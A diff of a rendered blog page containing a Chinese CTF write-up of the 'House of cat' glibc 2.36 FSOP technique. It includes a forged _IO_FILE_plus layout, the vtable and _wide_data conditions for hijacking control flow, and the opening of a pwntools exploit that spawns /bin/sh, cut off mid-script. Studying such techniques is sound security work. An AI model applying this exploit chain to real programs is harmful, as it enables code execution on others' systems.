@@ -11,20 +11,6 @@
 
   <!-- Baidu Push -->
   
-    <script>
-      (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-        }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-      })();
-    </script>
-  
 
   <meta charset="utf-8"/>
   <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -33,7 +19,7 @@
   <meta name="baidu-site-verification" content="PpzM9WxOJU"/>
 
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <meta name="description" content="It&#39;s an IT blog..."/>
+  <meta name="description" content="人生苦短，及时行乐"/>
   <meta name="keyword" content="Sagiring,blog"/>
   <link rel="shortcut icon" href="/img/avatar/good_to_look.jpg"/>
 
@@ -69,10 +55,6 @@
       <!-- ThemeColor end -->
     
 
-    
-      <!-- viewer start (Picture preview) -->
-      <link rel="stylesheet" href="/css/viewer.min.css"/>
-      <!-- viewer end -->
     
 
     
@@ -219,9 +201,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/archive/">
               
-              关于
+              归档
               
               
             </a>
@@ -241,9 +223,9 @@
           
           
           <li>
-            <a href="/archive/">
+            <a href="/about/">
               
-              归档
+              关于
               
               
             </a>
@@ -372,7 +354,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">1.1k</span> In Total
+              Words <span class="post-count">983</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -420,175 +402,181 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1 id="house-of-cat">House of cat</h1>
-<p>复现hgame week4 4nswer's gift</p>
+        <h1>House of cat</h1>
+<p>复现hgame week4 4nswer’s gift</p>
 <h2 id="题目">题目</h2>
-<h3 id="glibc版本-2.36">glibc版本 2.36</h3>
-<p><img src="/cn/Sagiring_markdown/House%20of%20cat/image-20231104111534552.png"></p>
+<h3 id="glibc版本-2-36">glibc版本 2.36</h3>
+<p>![](./House of cat/image-20231104111534552.png)</p>
 <h3 id="程序逻辑">程序逻辑</h3>
-<p><img src="/cn/Sagiring_markdown/House%20of%20cat/image-20231104111625351.png"></p>
+<p>![](./House of cat/image-20231104111625351.png)</p>
 <p>给了_IO_list_all的写入机会，且大小随意指定<code>malloc</code></p>
 <h2 id="解题思路">解题思路</h2>
 <p>首先有泄露libc地址。</p>
 <p>可以向malloc要一块很大的内存，让malloc调用mmap开辟空间。开辟出来的空间与libc偏移一致，fake_io便已知。</p>
 <p>高版本glibc 考虑打house of cat且有exit使用FSOP触发。</p>
-<h3 id="io_file_plus结构">_IO_FILE_plus结构</h3>
-<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">=</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">8</span>         <span class="co">#0x0   _flags </span></span>
-<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x8   _IO_read_ptr</span></span>
-<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x10  _IO_read_end</span></span>
-<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x18  _IO_read_base</span></span>
-<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x20  _IO_write_base</span></span>
-<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">1</span>)                <span class="co">#0x28  _IO_write_ptr</span></span>
-<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x30  _IO_write_end</span></span>
-<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x38  _IO_buf_base</span></span>
-<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x40  _IO_buf_end</span></span>
-<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x48  _IO_save_base</span></span>
-<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x50  _IO_backup_base</span></span>
-<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x58  _IO_save_end</span></span>
-<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x60  _markers</span></span>
-<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x68  _chain</span></span>
-<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">4</span>             <span class="co">#0x70  _fileno</span></span>
-<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">4</span>             <span class="co">#0x74  _flags2</span></span>
-<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x78  _old_offset</span></span>
-<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00\x00</span><span class="st">&#39;</span>           <span class="co">#0x80  _cur_column</span></span>
-<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>               <span class="co">#0x82  _vtable_offset</span></span>
-<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">5</span>             <span class="co">#0x83  _shortbuf</span></span>
-<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x88  _lock</span></span>
-<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x90  _offset</span></span>
-<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x98  _codecvt</span></span>
-<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0xa0  _wide_data    </span></span>
-<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0xa8  _freeres_list</span></span>
-<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0xb0  _freeres_bufr</span></span>
-<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0xb8  __pad5</span></span>
-<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00\x00\x00\x00</span><span class="st">&#39;</span>   <span class="co">#0xc0  _mode        </span></span>
-<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00\x00\x00\x00</span><span class="st">&#39;</span><span class="op">+</span> p64(<span class="dv">0</span>) <span class="op">*</span> <span class="dv">2</span> <span class="co">#0xc4  _unused2</span></span>
-<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0xd8  vtable</span></span></code></pre></div>
-<h3 id="house-of-cat-1">House of cat</h3>
+<h3 id="IO-FILE-plus结构">_IO_FILE_plus结构</h3>
+<pre><code class="language-python">fake_IO_FILE=b'\x00'*8         #0x0   _flags 
+fake_IO_FILE+=p64(0)                #0x8   _IO_read_ptr
+fake_IO_FILE+=p64(0)                #0x10  _IO_read_end
+fake_IO_FILE+=p64(0)                #0x18  _IO_read_base
+fake_IO_FILE+=p64(0)                #0x20  _IO_write_base
+fake_IO_FILE+=p64(1)                #0x28  _IO_write_ptr
+fake_IO_FILE+=p64(0)                #0x30  _IO_write_end
+fake_IO_FILE+=p64(0)                #0x38  _IO_buf_base
+fake_IO_FILE+=p64(0)                #0x40  _IO_buf_end
+fake_IO_FILE+=p64(0)                #0x48  _IO_save_base
+fake_IO_FILE+=p64(0)                #0x50  _IO_backup_base
+fake_IO_FILE+=p64(0)                #0x58  _IO_save_end
+fake_IO_FILE+=p64(0)                #0x60  _markers
+fake_IO_FILE+=p64(0)                #0x68  _chain
+fake_IO_FILE+=b'\x00'*4             #0x70  _fileno
+fake_IO_FILE+=b'\x00'*4             #0x74  _flags2
+fake_IO_FILE+=p64(0)                #0x78  _old_offset
+fake_IO_FILE+=b'\x00\x00'           #0x80  _cur_column
+fake_IO_FILE+=b'\x00'               #0x82  _vtable_offset
+fake_IO_FILE+=b'\x00'*5             #0x83  _shortbuf
+fake_IO_FILE+=p64(0)                #0x88  _lock
+fake_IO_FILE+=p64(0)                #0x90  _offset
+fake_IO_FILE+=p64(0)                #0x98  _codecvt
+fake_IO_FILE+=p64(0)                #0xa0  _wide_data    
+fake_IO_FILE+=p64(0)                #0xa8  _freeres_list
+fake_IO_FILE+=p64(0)                #0xb0  _freeres_bufr
+fake_IO_FILE+=p64(0)                #0xb8  __pad5
+fake_IO_FILE+=b'\x00\x00\x00\x00'   #0xc0  _mode        
+fake_IO_FILE+=b'\x00\x00\x00\x00'+ p64(0) * 2 #0xc4  _unused2
+fake_IO_FILE+=p64(0)                #0xd8  vtable
+
+</code></pre>
+<h3 id="House-of-cat">House of cat</h3>
 <p>触发IO函数的方式有FSOP、__malloc_assert</p>
 <p>通过修改vtable到虚表段中调用<code>_IO_wfile_seekof</code>-&gt;<code>_IO_switch_to_wget_mode</code></p>
 <p>其中<code>_IO_switch_to_wget_mode</code>的调用具体如下</p>
-<p><img src="/cn/Sagiring_markdown/House%20of%20cat/image-20231104112654061.png"></p>
+<p>![](./House of cat/image-20231104112654061.png)</p>
 <p>关键步骤如下。此时<code>rdi</code>为fp即我们伪造的fake_io结构，根据偏移构造地址，可以达到控制程序的目的。</p>
-<pre class="assembly"><code>mov rax, qword ptr [rdi + 0xa0]
+<pre><code class="language-assembly">mov rax, qword ptr [rdi + 0xa0]
 mov rdx, qword ptr [rax + 0x20]
 mov rax, qword ptr [rax + 0xe0]
-call qword ptr [rax + 0x18] //system、setcontext</code></pre>
+call qword ptr [rax + 0x18] //system、setcontext
+</code></pre>
 <p>可以调用system来<code>getshell</code>,也可以调用<code>setcontext</code>设置<code>rop</code>拿<code>flag</code></p>
 <p>在此之前我们的fake_io结构需要满足</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>_wide_data<span class="op">-&gt;</span>_IO_read_ptr ！<span class="op">=</span> _wide_data<span class="op">-&gt;</span>_IO_read_end</span></code></pre></div>
-<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>_wide_data<span class="op">-&gt;</span>_IO_write_ptr <span class="op">&gt;</span> _wide_data<span class="op">-&gt;</span>_IO_write_base</span></code></pre></div>
+<pre><code class="language-c">_wide_data-&gt;_IO_read_ptr ！= _wide_data-&gt;_IO_read_end
+</code></pre>
+<pre><code class="language-c">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base
+</code></pre>
 <p>_wide_data可以指向自己的fake_io</p>
-<p><code>fp-&gt;_IO_save_base &lt; fp-&gt;_IO_backup_base</code> ---
-在<code>_wide_data=fake_io_addr+0x30</code>条件下,当然可以自主调整</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>fp<span class="op">-&gt;</span>_lock是一个可写地址（堆地址、libc中的可写地址）</span></code></pre></div>
-<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>fp<span class="op">-&gt;</span>_mode <span class="op">=</span> <span class="dv">0</span></span></code></pre></div>
-<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>fp<span class="op">-</span>vtable <span class="op">=</span> _IO_wfile_jumps <span class="op">+</span> <span class="bn">0x30</span>  <span class="op">-&gt;</span> FSOP</span>
-<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>fp<span class="op">-</span>vtable <span class="op">=</span> _IO_wfile_jumps <span class="op">+</span> <span class="bn">0x10</span>  <span class="op">-&gt;</span> __malloc_assert</span></code></pre></div>
+<p><code>fp-&gt;_IO_save_base &lt; fp-&gt;_IO_backup_base</code>  — 在<code>_wide_data=fake_io_addr+0x30</code>条件下,当然可以自主调整</p>
+<pre><code class="language-c">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址）
+</code></pre>
+<pre><code class="language-c">fp-&gt;_mode = 0
+</code></pre>
+<pre><code class="language-c">fp-vtable = _IO_wfile_jumps + 0x30  -&gt; FSOP
+fp-vtable = _IO_wfile_jumps + 0x10  -&gt; __malloc_assert
+</code></pre>
 <h2 id="另外">另外</h2>
-<p>pwndbg可以直接b _IO_Fuction 来进行调试
-，也可以<code>p *(sruct _IO_FILE_plus *) 0x233333</code>或者p
-_IO_list_all来打印结构。</p>
-<h2 id="exp">Exp</h2>
+<p>pwndbg可以直接b _IO_Fuction 来进行调试 ，也可以<code>p *(sruct _IO_FILE_plus *) 0x233333</code>或者p _IO_list_all来打印结构。</p>
+<h2 id="Exp">Exp</h2>
 <p>最后贴出exp</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> p64,u64</span>
-<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> LibcSearcher <span class="im">import</span> <span class="op">*</span></span>
-<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>debug <span class="op">=</span> <span class="dv">1</span></span>
-<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>gdb_is <span class="op">=</span> <span class="dv">1</span></span>
-<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>elf_path <span class="op">=</span> <span class="st">&quot;./vuln&quot;</span></span>
-<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="co"># context(arch=&#39;i386&#39;,os = &#39;linux&#39;)</span></span>
-<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>context(arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>,os <span class="op">=</span> <span class="st">&#39;linux&#39;</span>, log_level<span class="op">=</span><span class="st">&#39;DEBUG&#39;</span>)</span>
-<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> debug:</span>
-<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>    context.terminal <span class="op">=</span> [<span class="st">&#39;wt.exe&#39;</span>,<span class="st">&#39;nt&#39;</span>,<span class="st">&#39;Ubuntu&#39;</span>,<span class="st">&#39;-c&#39;</span>]</span>
-<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> gdb_is:</span>
-<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>        r <span class="op">=</span> gdb.debug(<span class="st">&#39;./vuln&#39;</span>,<span class="st">&#39;set debug-file-directory ./.debug/&#39;</span>)</span>
-<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>        <span class="co"># gdb.attach(r,&#39;b* 0x4012ed&#39;)</span></span>
-<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>        <span class="co"># gdb.attach(r)</span></span>
-<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>        <span class="co"># pause()</span></span>
-<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a>        <span class="cf">pass</span></span>
-<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
-<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a>        r <span class="op">=</span> process(<span class="st">&quot;./vuln&quot;</span>)</span>
-<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>    </span>
-<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
-<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a>    host <span class="op">=</span> <span class="st">&quot;192.168.0.111:53783&quot;</span></span>
-<span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> <span class="ex">connect</span>(host.split(<span class="st">&#39;:&#39;</span>)[<span class="dv">0</span>],host.split(<span class="st">&#39;:&#39;</span>)[<span class="dv">1</span>])<span class="co">#远程连接</span></span>
-<span id="cb8-24"><a href="#cb8-24" aria-hidden="true" tabindex="-1"></a>    gdb_is <span class="op">=</span><span class="dv">0</span></span>
-<span id="cb8-25"><a href="#cb8-25" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-26"><a href="#cb8-26" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-27"><a href="#cb8-27" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-28"><a href="#cb8-28" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> show_addr(name,addr):</span>
-<span id="cb8-29"><a href="#cb8-29" aria-hidden="true" tabindex="-1"></a>      success(<span class="ss">f&#39;</span><span class="sc">&#123;</span>name<span class="sc">&#125;</span><span class="ss"> = </span><span class="sc">&#123;</span><span class="bu">hex</span>(addr)<span class="sc">&#125;</span><span class="ss">&#39;</span>)</span>
-<span id="cb8-30"><a href="#cb8-30" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-31"><a href="#cb8-31" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> revc_addr(r:process,name:<span class="bu">str</span>, until:<span class="bu">bytes</span> <span class="op">=</span><span class="st">b&#39;</span><span class="ch">\x7f</span><span class="st">&#39;</span>,offset:<span class="bu">int</span> <span class="op">=</span> <span class="dv">0</span>,addrType:<span class="bu">str</span> <span class="op">=</span><span class="st">&#39;bytes&#39;</span>)<span class="op">-&gt;</span><span class="bu">int</span>:</span>
-<span id="cb8-32"><a href="#cb8-32" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="bu">type</span>(until) <span class="op">==</span> <span class="bu">str</span>:</span>
-<span id="cb8-33"><a href="#cb8-33" aria-hidden="true" tabindex="-1"></a>        until <span class="op">=</span> until.encode()</span>
-<span id="cb8-34"><a href="#cb8-34" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> addrType <span class="op">==</span> <span class="st">&#39;bytes&#39;</span>:</span>
-<span id="cb8-35"><a href="#cb8-35" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="kw">not</span> offset:</span>
-<span id="cb8-36"><a href="#cb8-36" aria-hidden="true" tabindex="-1"></a>            addr <span class="op">=</span> u64(r.recvuntil(until).ljust(<span class="dv">8</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))</span>
-<span id="cb8-37"><a href="#cb8-37" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
-<span id="cb8-38"><a href="#cb8-38" aria-hidden="true" tabindex="-1"></a>            addr <span class="op">=</span> u64(r.recvuntil(until)[:offset].ljust(<span class="dv">8</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))</span>
-<span id="cb8-39"><a href="#cb8-39" aria-hidden="true" tabindex="-1"></a>    <span class="cf">elif</span> addrType <span class="op">==</span> <span class="st">&#39;str&#39;</span>:</span>
-<span id="cb8-40"><a href="#cb8-40" aria-hidden="true" tabindex="-1"></a>        addr <span class="op">=</span> <span class="bu">int</span>(r.recvuntil(until)[<span class="dv">2</span>:offset],<span class="dv">16</span>)</span>
-<span id="cb8-41"><a href="#cb8-41" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-42"><a href="#cb8-42" aria-hidden="true" tabindex="-1"></a>    show_addr(name,addr)</span>
-<span id="cb8-43"><a href="#cb8-43" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> addr</span>
-<span id="cb8-44"><a href="#cb8-44" aria-hidden="true" tabindex="-1"></a>    </span>
-<span id="cb8-45"><a href="#cb8-45" aria-hidden="true" tabindex="-1"></a>libc <span class="op">=</span> ELF(<span class="st">&#39;./libc.so.6&#39;</span>)</span>
-<span id="cb8-46"><a href="#cb8-46" aria-hidden="true" tabindex="-1"></a>elf <span class="op">=</span> ELF(elf_path)</span>
-<span id="cb8-47"><a href="#cb8-47" aria-hidden="true" tabindex="-1"></a>rop <span class="op">=</span> ROP(elf)</span>
-<span id="cb8-48"><a href="#cb8-48" aria-hidden="true" tabindex="-1"></a>r.recvuntil(<span class="st">b&#39;the box of it looks like this: &#39;</span>)</span>
-<span id="cb8-49"><a href="#cb8-49" aria-hidden="true" tabindex="-1"></a>libc.address <span class="op">=</span> revc_addr(r,<span class="st">b&#39;_IO_list_all&#39;</span>,<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>,<span class="op">-</span><span class="dv">1</span>,<span class="st">&#39;str&#39;</span>) <span class="op">-</span> <span class="bn">0x1f7660</span></span>
-<span id="cb8-50"><a href="#cb8-50" aria-hidden="true" tabindex="-1"></a>size <span class="op">=</span> <span class="bn">0x20000000</span></span>
-<span id="cb8-51"><a href="#cb8-51" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-52"><a href="#cb8-52" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-53"><a href="#cb8-53" aria-hidden="true" tabindex="-1"></a>r.sendlineafter(<span class="st">b&#39;put into the gift?</span><span class="ch">\n</span><span class="st">&#39;</span>,<span class="bu">str</span>(size).encode())</span>
-<span id="cb8-54"><a href="#cb8-54" aria-hidden="true" tabindex="-1"></a>show_addr(<span class="st">&#39;libc.address&#39;</span>,libc.address)</span>
-<span id="cb8-55"><a href="#cb8-55" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-56"><a href="#cb8-56" aria-hidden="true" tabindex="-1"></a><span class="co"># pause()</span></span>
-<span id="cb8-57"><a href="#cb8-57" aria-hidden="true" tabindex="-1"></a><span class="co"># house_of_cat</span></span>
-<span id="cb8-58"><a href="#cb8-58" aria-hidden="true" tabindex="-1"></a>fake_io_addr <span class="op">=</span> libc.address <span class="op">-</span> <span class="bn">0x20003ff0</span> <span class="co"># 伪造的fake_IO结构体的地址</span></span>
-<span id="cb8-59"><a href="#cb8-59" aria-hidden="true" tabindex="-1"></a>show_addr(<span class="st">&#39;fake_io_addr&#39;</span>,fake_io_addr)</span>
-<span id="cb8-60"><a href="#cb8-60" aria-hidden="true" tabindex="-1"></a>next_chain <span class="op">=</span> <span class="dv">0</span></span>
-<span id="cb8-61"><a href="#cb8-61" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-62"><a href="#cb8-62" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">=</span><span class="st">b&#39;/bin/sh</span><span class="ch">\x00</span><span class="st">&#39;</span>         <span class="co">#0x0   _flags =&gt; rdi</span></span>
-<span id="cb8-63"><a href="#cb8-63" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x8   _IO_read_ptr</span></span>
-<span id="cb8-64"><a href="#cb8-64" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x10  _IO_read_end</span></span>
-<span id="cb8-65"><a href="#cb8-65" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x18  _IO_read_base</span></span>
-<span id="cb8-66"><a href="#cb8-66" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x20  _IO_write_base</span></span>
-<span id="cb8-67"><a href="#cb8-67" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">1</span>)                <span class="co">#0x28  _IO_write_ptr</span></span>
-<span id="cb8-68"><a href="#cb8-68" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x30  _IO_write_end</span></span>
-<span id="cb8-69"><a href="#cb8-69" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x38  _IO_buf_base</span></span>
-<span id="cb8-70"><a href="#cb8-70" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x40  _IO_buf_end</span></span>
-<span id="cb8-71"><a href="#cb8-71" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x48  _IO_save_base</span></span>
-<span id="cb8-72"><a href="#cb8-72" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="bn">0x100</span>)            <span class="co">#0x50  _IO_backup_base</span></span>
-<span id="cb8-73"><a href="#cb8-73" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x58  _IO_save_end</span></span>
-<span id="cb8-74"><a href="#cb8-74" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x60  _markers</span></span>
-<span id="cb8-75"><a href="#cb8-75" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x68  _chain</span></span>
-<span id="cb8-76"><a href="#cb8-76" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">4</span>             <span class="co">#0x70  _fileno</span></span>
-<span id="cb8-77"><a href="#cb8-77" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">4</span>             <span class="co">#0x74  _flags2</span></span>
-<span id="cb8-78"><a href="#cb8-78" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x78  _old_offset</span></span>
-<span id="cb8-79"><a href="#cb8-79" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00\x00</span><span class="st">&#39;</span>           <span class="co">#0x80  _cur_column</span></span>
